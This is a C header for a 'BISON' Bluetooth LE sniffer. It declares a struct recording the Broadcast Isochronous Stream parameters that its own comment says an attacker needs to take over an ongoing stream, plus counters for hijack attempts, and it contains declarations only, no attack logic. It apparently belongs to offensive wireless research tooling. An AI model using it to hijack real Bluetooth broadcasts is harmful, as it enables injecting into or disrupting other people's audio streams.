/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * BISON sniffer: passive snapshot of every parameter the attacker needs
 * to take over an ongoing Broadcast Isochronous Stream.
 *
 */

#ifndef BISON_SNIFF_H_
#define BISON_SNIFF_H_

#include <stdbool.h>
#include <stdint.h>

#define BISON_CHM_SIZE 5U

struct bison_snapshot {
	/* True once at least one BIG event has been seen. */
	bool valid;

	/* From BIGInfo (set at sync, little-endian on the wire). */
	uint8_t  seed_access_addr[4];
	uint8_t  base_crc_init[2];
	uint16_t iso_interval;           /* units of 1.25 ms */
	uint32_t sub_interval_us;
	uint32_t bis_spacing_us;
	uint8_t  num_bis;
	uint8_t  nse;
	uint8_t  bn;
	uint8_t  irc;
	uint8_t  pto;
	uint8_t  phy;                    /* 1=1M, 2=2M, 4=Coded */
	uint8_t  framing;                /* 0=unframed, 1=framed */
	uint8_t  encrypted;              /* 0=open, 1=encrypted */
	uint8_t  max_pdu;                /* per-BIS max ciphertext length */

	/* Current channel state. */
	uint8_t  data_chan_map[BISON_CHM_SIZE];
	uint8_t  data_chan_count;

	/* Pending CHM update (if any). */
	bool     chm_update_pending;
	uint8_t  chm_chan_map[BISON_CHM_SIZE];
	uint8_t  chm_chan_count;
	uint16_t ctrl_instant;

	/* Per-event state, refreshed each BIG event. */
	uint64_t payload_count;          /* 39-bit on the wire */
	uint16_t event_counter;
	uint32_t anchor_ticks;           /* HAL ticker units */

	/* CSSN state observed by our receiver.
	 *
	 * cssn_curr: last CTRL PDU our receiver processed. Advances only
	 *            when a CTRL subevent RX succeeds.
	 * cssn_next: value snooped from the most recent data PDU with
	 *            cstf=1. Equals cssn_curr when nothing is pending;
	 *            != cssn_curr means "CTRL subevent coming up".
	 * cstf_observed_count: total data PDUs seen with cstf=1
	 *            (diagnostic only)
	 * pdu_hdr_last_byte: raw first byte of the most recently RX'd
	 *            data PDU (ll_id|cssn|cstf|rfu bit-packed). Sanity
	 *            check for the cssn/cstf decoding.
	 */
	uint8_t  cssn_curr;
	uint8_t  cssn_next;
	uint8_t  cssn_data_last;   /* CSSN from last RXed data PDU (any) */
	uint32_t data_pdu_snoop_count;  /* running total of tap invocations */
	uint32_t cstf_observed_count;
	uint8_t  pdu_hdr_last_byte;

	/* Diag stuff */
	uint32_t hijack_fired_count;
	uint32_t hijack_chain_armed_count;
	uint32_t hijack_tx_done_count;

	uint32_t hijack_last_chain_start_us;
	uint8_t  hijack_last_chain_chan;
	uint8_t  hijack_last_chain_aa[4];
};

/**
 * Snapshot the current sniffer state into @p out.
 *
 * Safe to call from any context. Returns false if no BIG event has been
 * seen yet (i.e. snapshot would be all zeros).
 */
bool bison_sniff_snapshot(struct bison_snapshot *out);

struct lll_sync_iso;
void bison_sniff_isr_update(const struct lll_sync_iso *lll,
			    uint16_t event_counter);

struct pdu_bis;
void bison_sniff_pdu_hdr(const struct pdu_bis *pdu);

void bison_sniff_note_hijack_fired(void);
void bison_sniff_note_hijack_chain_armed(uint32_t start_us, uint8_t chan,
					  const uint8_t aa[4]);
void bison_sniff_note_hijack_tx_done(void);

void bison_sniff_set_anchor(uint32_t ticks_at_event);

#endif /* BISON_SNIFF_H_ */
